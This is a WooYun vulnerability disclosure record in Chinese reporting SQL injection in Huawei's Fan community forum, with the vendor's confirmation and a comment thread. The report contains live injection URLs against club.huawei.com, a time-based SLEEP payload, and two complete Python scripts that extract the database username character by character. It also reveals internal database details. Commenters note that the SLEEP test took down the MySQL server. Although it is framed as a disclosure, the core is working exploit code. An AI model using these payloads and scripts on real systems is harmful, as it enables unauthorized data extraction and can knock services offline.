{"id": 71889, "wybug_id": "wooyun-2015-0149972", "wybug_title": "华为花粉用户社区存在SQL注入漏洞", "wybug_corp": "华为技术有限公司", "wybug_author": "猪猪侠", "wybug_date": "2015-10-27 23:02", "wybug_open_date": "2015-12-12 00:38", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-12：\t细节向公众公开  简要描述： 华为花粉社区存在SQL注入漏洞(1800万用户) 详细说明：  #1 注入地址返回正常内容\nhttp://club.huawei.com/plugin.php?sctime=0&page=3&srchtxt=%' AND 1=1 AND '%'='&action=search&sctype=0&id=auction\n\n\n返回查询内容为空\nhttp://club.huawei.com/plugin.php?sctime=0&page=3&srchtxt=%' AND 1=2 AND '%'='&action=search&sctype=0&id=auction\n\n\n   漏洞证明：  #2 利用方法，参照vip的sleep注入 WooYun: 唯品会www主站存在SQL注入漏洞 以5秒为指数\n(SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(USER()),1,1))=114)*5)))ring)\n\n#!/usr/bin/env python# encoding: utf-8# huawei_club.py # ringzero@0x557.orgimport requestsimport timeimport sysreload(sys)sys.setdefaultencoding('utf-8')payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')for i in range(1,20):    for _str in payloads:        start_time = time.time()        url = \"http://club.huawei.com/plugin.php?sctime=0&page=3&srchtxt=%' AND (SELECT * FROM (SELECT(SLEEP((ASCII(MID(LOWER(USER()),\" + str(i) + \",1))=\" + str(ord(_str)) + \")*5)))ring) AND '%'='&action=search&sctype=0&id=auction\"        result = requests.get(url).text        if(time.time() - start_time) > 3:            print _str            break\n#exp2 由于使用sleep会把论坛搞死，采用第二种方法，判断返回页面大小and 1=1 返回的page大小 > 30000and 1=2 返回的page大小 < 30000\n\n数据库用户名：huafen_new@10.41.50.36数据库：emotionui#使用返回网页大小判断EXPLOIT\n#!/usr/bin/env python# encoding: utf-8# huawei_club.py # ringzero@0x557.orgimport requestsimport sysreload(sys)sys.setdefaultencoding('utf-8')payloads = list('abcdefghijklmnopqrstuvwxyz0123456789@_.')for i in range(1,20):    for _str in payloads:        url = \"http://club.huawei.com/plugin.php?sctime=0&page=3&srchtxt=%' AND ASCII(MID(LOWER(USER()),\" + str(i) + \",1))=\" + str(ord(_str)) + \" AND '%'='&action=search&sctype=0&id=auction\"        result = requests.get(url).text        if len(result) > 30000:            print _str            break\n   修复方案：  # 搜索参数做转义或过滤   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-10-28 00:36 厂商回复： 感谢猪猪侠提醒，业务部门已进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-10-27 23:04 |    \t\tcreep \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:25        | 这家伙很懒，什么都没留下。)\t\t \n  沙发    \n     2015-10-27 23:05 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:569 漏洞数:89        | ®高级安全工程师 | WooYun认证√)\t\t \n  板凳    \n     2015-10-27 23:06 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3650 漏洞数:282        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  测试exp的时候，sleep，直接睡过去了    \n     2015-10-27 23:08 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:569 漏洞数:89        | ®高级安全工程师 | WooYun认证√)\t\t \n  @猪猪侠 然后就是 benchmark ？    \n     2015-10-27 23:09 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:543 漏洞数:61        | 没有我，你们就去背IP吧)\t\t \n  卧槽 该睡了    \n     2015-10-27 23:09 |    \t\tHackshy \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:22        | 猪猪侠爱吃棒棒糖)\t\t \n  @猪猪侠 你都有那么多超级EXP了，还要睡觉干吗？    \n     2015-10-27 23:10 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3650 漏洞数:282        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @Hackshy @DNS @hecate mysql服务器睡过去了    \n     2015-10-27 23:11 |    \t\thecate \t\t\t( 普通白帽子  |\t\t\t        Rank:569 漏洞数:89        | ®高级安全工程师 | WooYun认证√)\t\t \n  @猪猪侠 benchmark函数行否？    \n     2015-10-27 23:13 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:543 漏洞数:61        | 没有我，你们就去背IP吧)\t\t \n  @猪猪侠 你都那么多棒棒糖了，给我几个啊    \n     2015-10-27 23:28 |    \t\t心云 \t\t\t( 普通白帽子  |\t\t\t        Rank:153 漏洞数:49        | 闲的时候来一发)\t\t \n  叼    \n     2015-10-27 23:39 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3650 漏洞数:282        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  EXP 可以用二分折中算法改进    \n     2015-10-28 00:33 |    \t\tsqlfeng \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:40        | 我的中国心)\t\t \n  参见教主！教主千秋万载，一统江湖！    \n     2015-10-28 07:53 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  等公开看看。超级棒棒糖乃神器    \n     2015-10-28 09:30 |    \t\t有归于无 \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:20        | 有归于无)\t\t \n  怎么找出这么多漏洞的。。。    \n     2015-10-28 14:30 |    \t\tBeenQuiver \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:27        | 专注而高效，坚持好的习惯千万不要放弃)\t\t \n  神器真牛逼，好诱人    \n     2015-11-30 23:04 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:318 漏洞数:34        | 学习)\t\t \n  这是个0day吧    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}